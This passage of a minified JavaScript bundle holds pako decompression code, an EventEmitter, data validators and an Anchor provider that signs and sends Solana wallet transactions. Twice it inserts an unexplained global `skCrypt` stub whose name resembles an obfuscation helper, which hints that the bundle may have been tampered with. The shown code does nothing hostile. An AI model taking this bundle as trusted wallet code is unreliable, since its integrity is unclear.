                4 & n.wrap && (n.flags ? c : Pd(c)) !== n.check)
              ) {
                (t.msg = "incorrect data check"), (n.mode = xd);
                break;
              }
              (c = 0), (l = 0);
            }
            n.mode = 16207;
          case 16207:
            if (n.wrap && n.flags) {
              for (; l < 32; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              if (4 & n.wrap && c !== (4294967295 & n.total)) {
                (t.msg = "incorrect length check"), (n.mode = xd);
                break;
              }
              (c = 0), (l = 0);
            }
            n.mode = 16208;
          case 16208:
            I = md;
            break t;
          case xd:
            I = wd;
            break t;
          case 16210:
            return bd;
          default:
            return yd;
        }
      return (
        (t.next_out = s),
        (t.avail_out = u),
        (t.next_in = i),
        (t.avail_in = a),
        (n.hold = c),
        (n.bits = l),
        (n.wsize ||
          (f !== t.avail_out && n.mode < xd && (n.mode < Ed || e !== dd))) &&
          Kd(t, t.output, t.next_out, f - t.avail_out),
        (d -= t.avail_in),
        (f -= t.avail_out),
        (t.total_in += d),
        (t.total_out += f),
        (n.total += f),
        4 & n.wrap &&
          f &&
          (t.adler = n.check =
            n.flags
              ? Gl(n.check, o, f, t.next_out - f)
              : Fl(n.check, o, f, t.next_out - f)),
        (t.data_type =
          n.bits +
          (n.last ? 64 : 0) +
          (n.mode === Sd ? 128 : 0) +
          (n.mode === Cd || n.mode === Td ? 256 : 0)),
        ((0 === d && 0 === f) || e === dd) && I === pd && (I = vd),
        I
      );
    },
    jd = {
      inflateReset: Ld,
      inflateReset2: Nd,
      inflateResetKeep: Md,
      inflateInit: (t) => Dd(t, 15),
      inflateInit2: Dd,
      inflate: Fd,
      inflateEnd: (t) => {
        if (Od(t)) return yd;
        let e = t.state;
        return e.window && (e.window = null), (t.state = null), pd;
      },
      inflateGetHeader: (t, e) => {
        if (Od(t)) return yd;
        const n = t.state;
        return 2 & n.wrap ? ((n.head = e), (e.done = !1), pd) : yd;
      },
      inflateSetDictionary: (t, e) => {
        const n = e.length;
        let r, o, i;
        return Od(t)
          ? yd
          : ((r = t.state),
            0 !== r.wrap && r.mode !== Id
              ? yd
              : r.mode === Id && ((o = 1), (o = Fl(o, e, n, 0)), o !== r.check)
              ? wd
              : ((i = Kd(t, e, n, n)),
                i ? ((r.mode = 16210), bd) : ((r.havedict = 1), pd)));
      },
      inflateInfo: "pako inflate (from Nodeca project)",
    };
  var Gd = function () {
    (this.text = 0),
      (this.time = 0),
      (this.xflags = 0),
      (this.os = 0),
      (this.extra = null),
      (this.extra_len = 0),
      (this.name = ""),
      (this.comment = ""),
      (this.hcrc = 0),
      (this.done = !1);
  };
  const Vd = Object.prototype.toString,
    {
      Z_NO_FLUSH: Hd,
      Z_FINISH: Xd,
      Z_OK: Zd,
      Z_STREAM_END: Jd,
      Z_NEED_DICT: Yd,
      Z_STREAM_ERROR: Qd,
      Z_DATA_ERROR: $d,
      Z_MEM_ERROR: tf,
    } = Hl;
  function ef(t) {
    this.options = Zl({ chunkSize: 65536, windowBits: 15, to: "" }, t || {});
    const e = this.options;
    e.raw &&
      e.windowBits >= 0 &&
      e.windowBits < 16 &&
      ((e.windowBits = -e.windowBits),
      0 === e.windowBits && (e.windowBits = -15)),
      !(e.windowBits >= 0 && e.windowBits < 16) ||
        (t && t.windowBits) ||
        (e.windowBits += 32),
      e.windowBits > 15 &&
        e.windowBits < 48 &&
        (15 & e.windowBits || (e.windowBits |= 15)),
      (this.err = 0),
      (this.msg = ""),
      (this.ended = !1),
      (this.chunks = []),
      (this.strm = new nd()),
      (this.strm.avail_out = 0);
    let n = jd.inflateInit2(this.strm, e.windowBits);
    if (n !== Zd) throw new Error(Vl[n]);
    if (
      ((this.header = new Gd()),
      jd.inflateGetHeader(this.strm, this.header),
      e.dictionary &&
        ("string" == typeof e.dictionary
          ? (e.dictionary = $l(e.dictionary))
          : "[object ArrayBuffer]" === Vd.call(e.dictionary) &&
            (e.dictionary = new Uint8Array(e.dictionary)),
        e.raw &&
          ((n = jd.inflateSetDictionary(this.strm, e.dictionary)), n !== Zd)))
    )
      throw new Error(Vl[n]);
  }
  (ef.prototype.push = function (t, e) {
    const n = this.strm,
      r = this.options.chunkSize,
      o = this.options.dictionary;
    let i, s, a;
    if (this.ended) return !1;
    for (
      s = e === ~~e ? e : !0 === e ? Xd : Hd,
        "[object ArrayBuffer]" === Vd.call(t)
          ? (n.input = new Uint8Array(t))
          : (n.input = t),
        n.next_in = 0,
        n.avail_in = n.input.length;
      ;

    ) {
      for (
        0 === n.avail_out &&
          ((n.output = new Uint8Array(r)), (n.next_out = 0), (n.avail_out = r)),
          i = jd.inflate(n, s),
          i === Yd &&
            o &&
            ((i = jd.inflateSetDictionary(n, o)),
            i === Zd ? (i = jd.inflate(n, s)) : i === $d && (i = Yd));
        n.avail_in > 0 && i === Jd && n.state.wrap > 0 && 0 !== t[n.next_in];

      )
        jd.inflateReset(n), (i = jd.inflate(n, s));
      switch (i) {
        case Qd:
        case $d:
        case Yd:
        case tf:
          return this.onEnd(i), (this.ended = !0), !1;
      }
      if (((a = n.avail_out), n.next_out && (0 === n.avail_out || i === Jd)))
        if ("string" === this.options.to) {
          let t = ed(n.output, n.next_out),
            e = n.next_out - t,
            o = td(n.output, t);
          (n.next_out = e),
            (n.avail_out = r - e),
            e && n.output.set(n.output.subarray(t, t + e), 0),
            this.onData(o);
        } else
          this.onData(
            n.output.length === n.next_out
              ? n.output
              : n.output.subarray(0, n.next_out)
          );
      if (i !== Zd || 0 !== a) {
        if (i === Jd)
          return (
            (i = jd.inflateEnd(this.strm)), this.onEnd(i), (this.ended = !0), !0
          );
        if (0 === n.avail_in) break;
      }
    }
    return !0;
  }),
    (ef.prototype.onData = function (t) {
      this.chunks.push(t);
    }),
    (ef.prototype.onEnd = function (t) {
      t === Zd &&
        ("string" === this.options.to
          ? (this.result = this.chunks.join(""))
          : (this.result = Jl(this.chunks))),
        (this.chunks = []),
        (this.err = t),
        (this.msg = this.strm.msg);
    });
  var nf = {
    inflate: function (t, e) {
      const n = new ef(e);
      if ((n.push(t), n.err)) throw n.msg || Vl[n.err];
      return n.result;
    },
  };
  const { inflate: rf } = nf;
  var of,
    sf = rf,
    af = { exports: {} };
  var uf =
    (of ||
      ((of = 1),
      (function (t) {
        window.skCrypt = function (t) {
          return function () {
            return t;
          };
        };
        var e = Object.prototype.hasOwnProperty,
          n = "~";
        function r() {}
        function o(t, e, n) {
          (this.fn = t), (this.context = e), (this.once = n || !1);
        }
        function i(t, e, r, i, s) {
          if ("function" != typeof r)
            throw new TypeError("The listener must be a function");
          var a = new o(r, i || t, s),
            u = n ? n + e : e;
          return (
            t._events[u]
              ? t._events[u].fn
                ? (t._events[u] = [t._events[u], a])
                : t._events[u].push(a)
              : ((t._events[u] = a), t._eventsCount++),
            t
          );
        }
        function s(t, e) {
          0 === --t._eventsCount ? (t._events = new r()) : delete t._events[e];
        }
        function a() {
          (this._events = new r()), (this._eventsCount = 0);
        }
        Object.create &&
          ((r.prototype = Object.create(null)), new r().__proto__ || (n = !1)),
          (a.prototype.eventNames = function () {
            var t,
              r,
              o = [];
            if (0 === this._eventsCount) return o;
            for (r in (t = this._events))
              e.call(t, r) && o.push(n ? r.slice(1) : r);
            return Object.getOwnPropertySymbols
              ? o.concat(Object.getOwnPropertySymbols(t))
              : o;
          }),
          (a.prototype.listeners = function (t) {
            var e = n ? n + t : t,
              r = this._events[e];
            if (!r) return [];
            if (r.fn) return [r.fn];
            for (var o = 0, i = r.length, s = new Array(i); o < i; o++)
              s[o] = r[o].fn;
            return s;
          }),
          (a.prototype.listenerCount = function (t) {
            var e = n ? n + t : t,
              r = this._events[e];
            return r ? (r.fn ? 1 : r.length) : 0;
          }),
          (a.prototype.emit = function (t, e, r, o, i, s) {
            var a = n ? n + t : t;
            if (!this._events[a]) return !1;
            var u,
              c,
              l = this._events[a],
              d = arguments.length;
            if (l.fn) {
              switch ((l.once && this.removeListener(t, l.fn, void 0, !0), d)) {
                case 1:
                  return l.fn.call(l.context), !0;
                case 2:
                  return l.fn.call(l.context, e), !0;
                case 3:
                  return l.fn.call(l.context, e, r), !0;
                case 4:
                  return l.fn.call(l.context, e, r, o), !0;
                case 5:
                  return l.fn.call(l.context, e, r, o, i), !0;
                case 6:
                  return l.fn.call(l.context, e, r, o, i, s), !0;
              }
              for (c = 1, u = new Array(d - 1); c < d; c++)
                u[c - 1] = arguments[c];
              l.fn.apply(l.context, u);
            } else {
              var f,
                h = l.length;
              for (c = 0; c < h; c++)
                switch (
                  (l[c].once && this.removeListener(t, l[c].fn, void 0, !0), d)
                ) {
                  case 1:
                    l[c].fn.call(l[c].context);
                    break;
                  case 2:
                    l[c].fn.call(l[c].context, e);
                    break;
                  case 3:
                    l[c].fn.call(l[c].context, e, r);
                    break;
                  case 4:
                    l[c].fn.call(l[c].context, e, r, o);
                    break;
                  default:
                    if (!u)
                      for (f = 1, u = new Array(d - 1); f < d; f++)
                        u[f - 1] = arguments[f];
                    l[c].fn.apply(l[c].context, u);
                }
            }
            return !0;
          }),
          (a.prototype.on = function (t, e, n) {
            return i(this, t, e, n, !1);
          }),
          (a.prototype.once = function (t, e, n) {
            return i(this, t, e, n, !0);
          }),
          (a.prototype.removeListener = function (t, e, r, o) {
            var i = n ? n + t : t;
            if (!this._events[i]) return this;
            if (!e) return s(this, i), this;
            var a = this._events[i];
            if (a.fn)
              a.fn !== e ||
                (o && !a.once) ||
                (r && a.context !== r) ||
                s(this, i);
            else {
              for (var u = 0, c = [], l = a.length; u < l; u++)
                (a[u].fn !== e ||
                  (o && !a[u].once) ||
                  (r && a[u].context !== r)) &&
                  c.push(a[u]);
              c.length
                ? (this._events[i] = 1 === c.length ? c[0] : c)
                : s(this, i);
            }
            return this;
          }),
          (a.prototype.removeAllListeners = function (t) {
            var e;
            return (
              t
                ? ((e = n ? n + t : t), this._events[e] && s(this, e))
                : ((this._events = new r()), (this._eventsCount = 0)),
              this
            );
          }),
          (a.prototype.off = a.prototype.removeListener),
          (a.prototype.addListener = a.prototype.on),
          (a.prefixed = n),
          (a.EventEmitter = a),
          (t.exports = a);
      })(af)),
    af.exports);
  const cf = Un(uf);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const lf = (t) => "version" in t;
  function df(t) {
    return xl.encode(t);
  }
  function ff(t) {
    return lt.from(t, "base64");
  }
  function hf(t) {
    return "accounts" in t;
  }
  const pf = zl.struct([zl.publicKey("authority"), zl.vecU8("data")]);
  function mf(t, e, n, r) {
    return (null == t ? void 0 : t.length) ? (t[0].name ? n(t) : r(t)) : e();
  }
  function gf(t, ...e) {
    if (t.args.length != e.length) throw new Error("Invalid argument length");
    const n = {};
    let r = 0;
    return (
      t.args.forEach((t) => {
        (n[t.name] = e[r]), (r += 1);
      }),
      n
    );
  }
  function yf(t, e = {}) {
    t.forEach((t) => {
      if (hf(t)) yf(t.accounts, e[t.name]);
      else if (!e[t.name])
        throw new Error(`Account \`${t.name}\` not provided.`);
    });
  }
  function wf(t) {
    return t instanceof Xi ? t : new Xi(t);
  }
  class bf extends TypeError {
    constructor(t, e) {
      let n;
      const { message: r, ...o } = t,
        { path: i } = t;
      super(0 === i.length ? r : "At path: " + i.join(".") + " -- " + r),
        (this.value = void 0),
        (this.key = void 0),
        (this.type = void 0),
        (this.refinement = void 0),
        (this.path = void 0),
        (this.branch = void 0),
        (this.failures = void 0),
        Object.assign(this, o),
        (this.name = this.constructor.name),
        (this.failures = () => {
          var r;
          return null != (r = n) ? r : (n = [t, ...e()]);
        });
    }
  }
  function vf(t) {
    return "object" == typeof t && null != t;
  }
  function Af(t) {
    return "string" == typeof t ? JSON.stringify(t) : "" + t;
  }
  function kf(t, e, n, r) {
    if (!0 === t) return;
    !1 === t ? (t = {}) : "string" == typeof t && (t = { message: t });
    const { path: o, branch: i } = e,
      { type: s } = n,
      {
        refinement: a,
        message: u = "Expected a value of type `" +
          s +
          "`" +
          (a ? " with refinement `" + a + "`" : "") +
          ", but received: `" +
          Af(r) +
          "`",
      } = t;
    return {
      value: r,
      type: s,
      refinement: a,
      key: o[o.length - 1],
      path: o,
      branch: i,
      ...t,
      message: u,
    };
  }
  function* If(t, e, n, r) {
    var o;
    (vf((o = t)) && "function" == typeof o[Symbol.iterator]) || (t = [t]);
    for (const i of t) {
      const t = kf(i, e, n, r);
      t && (yield t);
    }
  }
  function* Sf(t, e, n) {
    void 0 === n && (n = {});
    const { path: r = [], branch: o = [t], coerce: i = !1, mask: s = !1 } = n,
      a = { path: r, branch: o };
    if (
      i &&
      ((t = e.coercer(t, a)),
      s && "type" !== e.type && vf(e.schema) && vf(t) && !Array.isArray(t))
    )
      for (const c in t) void 0 === e.schema[c] && delete t[c];
    let u = !0;
    for (const c of e.validator(t, a)) (u = !1), yield [c, void 0];
    for (let [c, l, d] of e.entries(t, a)) {
      const e = Sf(l, d, {
        path: void 0 === c ? r : [...r, c],
        branch: void 0 === c ? o : [...o, l],
        coerce: i,
        mask: s,
      });
      for (const n of e)
        n[0]
          ? ((u = !1), yield [n[0], void 0])
          : i &&
            ((l = n[1]),
            void 0 === c
              ? (t = l)
              : t instanceof Map
              ? t.set(c, l)
              : t instanceof Set
              ? t.add(l)
              : vf(t) && (t[c] = l));
    }
    if (u) for (const c of e.refiner(t, a)) (u = !1), yield [c, void 0];
    u && (yield [void 0, t]);
  }
  class _f {
    constructor(t) {
      (this.TYPE = void 0),
        (this.type = void 0),
        (this.schema = void 0),
        (this.coercer = void 0),
        (this.validator = void 0),
        (this.refiner = void 0),
        (this.entries = void 0);
      const {
        type: e,
        schema: n,
        validator: r,
        refiner: o,
        coercer: i = (t) => t,
        entries: s = function* () {},
      } = t;
      (this.type = e),
        (this.schema = n),
        (this.entries = s),
        (this.coercer = i),
        (this.validator = r ? (t, e) => If(r(t, e), e, this, t) : () => []),
        (this.refiner = o ? (t, e) => If(o(t, e), e, this, t) : () => []);
    }
    assert(t) {
      return (function (t, e) {
        const n = Bf(t, e);
        if (n[0]) throw n[0];
      })(t, this);
    }
    create(t) {
      return Tf(t, this);
    }
    is(t) {
      return Cf(t, this);
    }
    mask(t) {
      return (function (t, e) {
        const n = Bf(t, e, { coerce: !0, mask: !0 });
        if (n[0]) throw n[0];
        return n[1];
      })(t, this);
    }
    validate(t, e) {
      return void 0 === e && (e = {}), Bf(t, this, e);
    }
  }
  function Tf(t, e) {
    const n = Bf(t, e, { coerce: !0 });
    if (n[0]) throw n[0];
    return n[1];
  }
  function Cf(t, e) {
    return !Bf(t, e)[0];
  }
  function Bf(t, e, n) {
    void 0 === n && (n = {});
    const r = Sf(t, e, n),
      o = (function (t) {
        const { done: e, value: n } = t.next();
        return e ? void 0 : n;
      })(r);
    if (o[0]) {
      return [
        new bf(o[0], function* () {
          for (const t of r) t[0] && (yield t[0]);
        }),
        void 0,
      ];
    }
    return [void 0, o[1]];
  }
  function Ef(t, e) {
    return new _f({ type: t, schema: null, validator: e });
  }
  function xf(t) {
    return new _f({
      type: "array",
      schema: t,
      *entries(e) {
        if (t && Array.isArray(e))
          for (const [n, r] of e.entries()) yield [n, r, t];
      },
      coercer: (t) => (Array.isArray(t) ? t.slice() : t),
      validator: (t) =>
        Array.isArray(t) || "Expected an array value, but received: " + Af(t),
    });
  }
  function Pf(t) {
    const e = Af(t);
    return new _f({
      type: "literal",
      schema: t,
      validator: (n) =>
        n === t || "Expected the literal `" + e + "`, but received: " + Af(n),
    });
  }
  function Rf(t) {
    return new _f({
      ...t,
      validator: (e, n) => null === e || t.validator(e, n),
      refiner: (e, n) => null === e || t.refiner(e, n),
    });
  }
  function Of() {
    return Ef(
      "number",
      (t) =>
        ("number" == typeof t && !isNaN(t)) ||
        "Expected a number, but received: " + Af(t)
    );
  }
  function Mf(t) {
    return new _f({
      ...t,
      validator: (e, n) => void 0 === e || t.validator(e, n),
      refiner: (e, n) => void 0 === e || t.refiner(e, n),
    });
  }
  function Lf() {
    return Ef(
      "string",
      (t) => "string" == typeof t || "Expected a string, but received: " + Af(t)
    );
  }
  function Nf(t) {
    const e = Object.keys(t);
    return new _f({
      type: "type",
      schema: t,
      *entries(n) {
        if (vf(n)) for (const r of e) yield [r, n[r], t[r]];
      },
      validator: (t) => vf(t) || "Expected an object, but received: " + Af(t),
    });
  }
  function Df(t) {
    const e = t.map((t) => t.type).join(" | ");
    return new _f({
      type: "union",
      schema: null,
      coercer: (e, n) =>
        (
          t.find((t) => {
            const [n] = t.validate(e, { coerce: !0 });
            return !n;
          }) || Uf()
        ).coercer(e, n),
      validator(n, r) {
        const o = [];
        for (const e of t) {
          const [...t] = Sf(n, e, r),
            [i] = t;
          if (!i[0]) return [];
          for (const [e] of t) e && o.push(e);
        }
        return [
          "Expected the value to satisfy a union of `" +
            e +
            "`, but received: " +
            Af(n),
          ...o,
        ];
      },
    });
  }
  function Uf() {
    return Ef("unknown", () => !0);
  }
  async function qf(t, e, n) {
    if (e.length <= 99) return await Wf(t, e, n);
    {
      const i =
        ((r = e),
        (o = 99),
        Array.apply(0, new Array(Math.ceil(r.length / o))).map((t, e) =>
          r.slice(e * o, (e + 1) * o)
        ));
      return (await Promise.all(i.map((e) => Wf(t, e, n)))).flat();
    }
    var r, o;
  }
  async function Wf(t, e, n) {
    const r = null != n ? n : t.commitment,
      { value: o, context: i } = await t.getMultipleAccountsInfoAndContext(
        e,
        r
      );
    return o.map((t, n) =>
      null === t ? null : { publicKey: e[n], account: t, context: i }
    );
  }
  function zf(t) {
    return (
      (e = Ff(t)),
      (n = Kf),
      (r = (e) => ("error" in e ? e : { ...e, result: Tf(e.result, t) })),
      new _f({
        ...e,
        coercer: (t, o) => (Cf(t, n) ? e.coercer(r(t, o), o) : e.coercer(t, o)),
      })
    );
    var e, n, r;
  }
  const Kf = Ff(Uf());
  function Ff(t) {
    return Df([
      Nf({ jsonrpc: Pf("2.0"), id: Lf(), result: t }),
      Nf({
        jsonrpc: Pf("2.0"),
        id: Lf(),
        error: Nf({ code: Uf(), message: Lf(), data: Mf(Ef("any", () => !0)) }),
      }),
    ]);
  }
  const jf =
    ((Gf = Nf({
      err: Rf(Df([Nf({}), Lf()])),
      logs: Rf(xf(Lf())),
      accounts: Mf(
        Rf(
          xf(
            Rf(
              Nf({
                executable: Ef("boolean", (t) => "boolean" == typeof t),
                owner: Lf(),
                lamports: Of(),
                data: xf(Lf()),
                rentEpoch: Mf(Of()),
              })
            )
          )
        )
      ),
      unitsConsumed: Mf(Of()),
    })),
    zf(Nf({ context: Nf({ slot: Of() }), value: Gf })));
  var Gf;
  class Vf {
    constructor(t, e, n = Vf.defaultOptions()) {
      (this.connection = t),
        (this.wallet = e),
        (this.opts = n),
        (this.publicKey = null == e ? void 0 : e.publicKey);
    }
    static defaultOptions() {
      return { preflightCommitment: "processed", commitment: "processed" };
    }
    static local(t, e = Vf.defaultOptions()) {
      throw new Error("Provider local is not available on browser.");
    }
    static env() {
      throw new Error("Provider env is not available on browser.");
    }
    async sendAndConfirm(t, e, n) {
      var r, o, i, s;
      if ((void 0 === n && (n = this.opts), lf(t))) e && t.sign(e);
      else if (
        ((t.feePayer =
          null !== (r = t.feePayer) && void 0 !== r
            ? r
            : this.wallet.publicKey),
        (t.recentBlockhash = (
          await this.connection.getLatestBlockhash(n.preflightCommitment)
        ).blockhash),
        e)
      )
        for (const c of e) t.partialSign(c);
      const a = (t = await this.wallet.signTransaction(t)).serialize();
      try {
        return await Xf(this.connection, a, n);
      } catch (u) {
        if (u instanceof Zf) {
          const e = df(
              lf(t)
                ? (null === (o = t.signatures) || void 0 === o
                    ? void 0
                    : o[0]) || new Uint8Array()
                : null !== (i = t.signature) && void 0 !== i
                ? i
                : new Uint8Array()
            ),
            n = lf(t) ? 0 : void 0,
            r = await this.connection.getTransaction(e, {
              commitment: "confirmed",
              maxSupportedTransactionVersion: n,
            });
          if (r) {
            const t =
              null === (s = r.meta) || void 0 === s ? void 0 : s.logMessages;
            throw t ? new Ps(u.message, t) : u;
          }
          throw u;
        }
        throw u;
      }
    }
    async sendAll(t, e) {
      var n, r, o;
      void 0 === e && (e = this.opts);
      const i = (
        await this.connection.getLatestBlockhash(e.preflightCommitment)
      ).blockhash;
      let s = t.map((t) => {
        var e, n;
        if (lf(t.tx)) {
          let e = t.tx;
          return t.signers && e.sign(t.signers), e;
        }
        {
          let r = t.tx,
            o = null !== (e = t.signers) && void 0 !== e ? e : [];
          return (
            (r.feePayer =
              null !== (n = r.feePayer) && void 0 !== n
                ? n
                : this.wallet.publicKey),
            (r.recentBlockhash = i),
            o.forEach((t) => {
              r.partialSign(t);
            }),
            r
          );
        }
      });
      const a = await this.wallet.signAllTransactions(s),
        u = [];
      for (let l = 0; l < s.length; l += 1) {
        const t = a[l],
          i = t.serialize();
        try {
          u.push(await Xf(this.connection, i, e));
        } catch (c) {
          if (c instanceof Zf) {
            const e = df(
                lf(t)
                  ? (null === (n = t.signatures) || void 0 === n
                      ? void 0
                      : n[0]) || new Uint8Array()
                  : null !== (r = t.signature) && void 0 !== r
                  ? r
                  : new Uint8Array()
              ),
              i = lf(t) ? 0 : void 0,
              s = await this.connection.getTransaction(e, {
                commitment: "confirmed",
                maxSupportedTransactionVersion: i,
              });
            if (s) {
              const t =
                null === (o = s.meta) || void 0 === o ? void 0 : o.logMessages;
              throw t ? new Ps(c.message, t) : c;
            }
            throw c;
          }
          throw c;
        }
      }
      return u;
    }
    async simulate(t, e, n, r) {
      let o,
        i = (
          await this.connection.getLatestBlockhash(
            null != n ? n : this.connection.commitment
          )
        ).blockhash;
      if (
        (lf(t)
          ? (e &&
              e.length > 0 &&
              (t.sign(e), (t = await this.wallet.signTransaction(t))),
            (o = await this.connection.simulateTransaction(t, {
              commitment: n,
            })))
          : ((t.feePayer = t.feePayer || this.wallet.publicKey),
            (t.recentBlockhash = i),
            e && e.length > 0 && (t = await this.wallet.signTransaction(t)),
            (o = await (async function (t, e, n, r, o) {
              var i;
              n && n.length > 0 && e.sign(...n);
              const s = e._compile(),
                a = s.serialize(),
                u = e._serialize(a).toString("base64"),
                c = {
                  encoding: "base64",
                  commitment: null != r ? r : t.commitment,
                };
              if (o) {
                const t = (Array.isArray(o) ? o : s.nonProgramIds()).map((t) =>
                  t.toBase58()
                );
                c.accounts = { encoding: "base64", addresses: t };
              }
              n && n.length > 0 && (c.sigVerify = !0);
              const l = [u, c],
                d = Tf(await t._rpcRequest("simulateTransaction", l), jf);
              if ("error" in d) {
                let t;
                if (
                  "data" in d.error &&
                  ((t =
                    null === (i = d.error.data) || void 0 === i
                      ? void 0
                      : i.logs),
                  t && Array.isArray(t))
                ) {
                  const e = "\n    ";
                  t.join(e);
                }
                throw new Ps(
                  "failed to simulate transaction: " + d.error.message,
                  t
                );
              }
              return d.result;
            })(this.connection, t, e, n, r))),
        o.value.err)
      )
        throw new Hf(o.value);
      return o.value;
    }
  }
  class Hf extends Error {
    constructor(t, e) {
      super(e), (this.simulationResponse = t);
    }
  }
  async function Xf(t, e, n) {
    const r = n
      ? {
          skipPreflight: n.skipPreflight,
          preflightCommitment: n.preflightCommitment || n.commitment,
          maxRetries: n.maxRetries,
          minContextSlot: n.minContextSlot,
        }
      : {};
    let o;
    const i = Date.now();
    for (; Date.now() - i < 6e4; )
      try {
        const i = await t.sendRawTransaction(e, r);
        if (null == n ? void 0 : n.blockhash)
          if (0 === r.maxRetries) {
            const e = AbortSignal.timeout(15e3);
            o = (
              await t.confirmTransaction(
                { abortSignal: e, signature: i, ...n.blockhash },
                n && n.commitment
              )
            ).value;
          } else
            o = (
              await t.confirmTransaction(
                { signature: i, ...n.blockhash },
                n && n.commitment
              )
            ).value;
        else o = (await t.confirmTransaction(i, n && n.commitment)).value;
        if (o.err)
          throw new Zf(`Raw transaction ${i} failed (${JSON.stringify(o)})`);
        return i;
      } catch (s) {
        if ("TimeoutError" === s.name) continue;
        throw s;
      }
    throw Error("Transaction failed to confirm in 60s");
  }
  class Zf extends Error {
    constructor(t) {
      super(t);
    }
  }
  function Jf() {
    return Vf.local();
  }
  var Yf =
      "undefined" != typeof globalThis
        ? globalThis
        : "undefined" != typeof window
        ? window
        : void 0 !== Sl
        ? Sl
        : "undefined" != typeof self
        ? self
        : {},
    Qf = {};
  Object.defineProperty(Qf, "__esModule", { value: !0 });
  var $f =
      (Qf.ANCHOR_ERROR__REQUIRE_EQ_VIOLATED =
      Qf.ANCHOR_ERROR__REQUIRE_VIOLATED =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION_PROGRAM_ID =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION_AUTHORITY =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_TRANSFER_HOOK_EXTENSION =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_PERMANENT_DELEGATE_EXTENSION_DELEGATE =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_PERMANENT_DELEGATE_EXTENSION =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_CLOSE_AUTHORITY_EXTENSION_AUTHORITY =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_CLOSE_AUTHORITY_EXTENSION =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION_METADATA_ADDRESS =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION_AUTHORITY =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_METADATA_POINTER_EXTENSION =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION_MEMBER_ADDRESS =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION_AUTHORITY =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_MEMBER_POINTER_EXTENSION =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION_GROUP_ADDRESS =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION_AUTHORITY =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_GROUP_POINTER_EXTENSION =
      Qf.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED_TOKEN_TOKEN_PROGRAM =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_TOKEN_PROGRAM =
      Qf.ANCHOR_ERROR__CONSTRAINT_TOKEN_TOKEN_PROGRAM =
      Qf.ANCHOR_ERROR__CONSTRAINT_ACCOUNT_IS_NONE =
      Qf.ANCHOR_ERROR__CONSTRAINT_SPACE =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_DECIMALS =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_FREEZE_AUTHORITY =
      Qf.ANCHOR_ERROR__CONSTRAINT_MINT_MINT_AUTHORITY =
      Qf.ANCHOR_ERROR__CONSTRAINT_TOKEN_OWNER =
      Qf.ANCHOR_ERROR__CONSTRAINT_TOKEN_MINT =
      Qf.ANCHOR_ERROR__CONSTRAINT_ZERO =
      Qf.ANCHOR_ERROR__CONSTRAINT_ADDRESS =
      Qf.ANCHOR_ERROR__CONSTRAINT_CLOSE =
      Qf.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED_INIT =
      Qf.ANCHOR_ERROR__CONSTRAINT_ASSOCIATED =
      Qf.ANCHOR_ERROR__CONSTRAINT_STATE =
      Qf.ANCHOR_ERROR__CONSTRAINT_EXECUTABLE =
      Qf.ANCHOR_ERROR__CONSTRAINT_SEEDS =
      Qf.ANCHOR_ERROR__CONSTRAINT_RENT_EXEMPT =
      Qf.ANCHOR_ERROR__CONSTRAINT_OWNER =
      Qf.ANCHOR_ERROR__CONSTRAINT_RAW =
      Qf.ANCHOR_ERROR__CONSTRAINT_SIGNER =
      Qf.ANCHOR_ERROR__CONSTRAINT_HAS_ONE =
      Qf.ANCHOR_ERROR__CONSTRAINT_MUT =
      Qf.ANCHOR_ERROR__EVENT_INSTRUCTION_STUB =
      Qf.ANCHOR_ERROR__IDL_ACCOUNT_NOT_EMPTY =
      Qf.ANCHOR_ERROR__IDL_INSTRUCTION_INVALID_PROGRAM =
      Qf.ANCHOR_ERROR__IDL_INSTRUCTION_STUB =
      Qf.ANCHOR_ERROR__INSTRUCTION_DID_NOT_SERIALIZE =
      Qf.ANCHOR_ERROR__INSTRUCTION_DID_NOT_DESERIALIZE =
      Qf.ANCHOR_ERROR__INSTRUCTION_FALLBACK_NOT_FOUND =
      Qf.ANCHOR_ERROR__INSTRUCTION_MISSING =
        void 0),
    th =
      (Qf.ANCHOR_ERROR__DEPRECATED =
      Qf.ANCHOR_ERROR__INVALID_NUMERIC_CONVERSION =
      Qf.ANCHOR_ERROR__TRYING_TO_INIT_PAYER_AS_PROGRAM_ACCOUNT =
      Qf.ANCHOR_ERROR__DECLARED_PROGRAM_ID_MISMATCH =
      Qf.ANCHOR_ERROR__ACCOUNT_DUPLICATE_REALLOCS =
      Qf.ANCHOR_ERROR__ACCOUNT_REALLOC_EXCEEDS_LIMIT =
      Qf.ANCHOR_ERROR__ACCOUNT_SYSVAR_MISMATCH =
      Qf.ANCHOR_ERROR__ACCOUNT_NOT_ASSOCIATED_TOKEN_ACCOUNT =
      Qf.ANCHOR_ERROR__ACCOUNT_NOT_PROGRAM_DATA =
      Qf.ANCHOR_ERROR__ACCOUNT_NOT_INITIALIZED =
      Qf.ANCHOR_ERROR__ACCOUNT_NOT_SYSTEM_OWNED =
      Qf.ANCHOR_ERROR__ACCOUNT_NOT_SIGNER =
      Qf.ANCHOR_ERROR__INVALID_PROGRAM_EXECUTABLE =
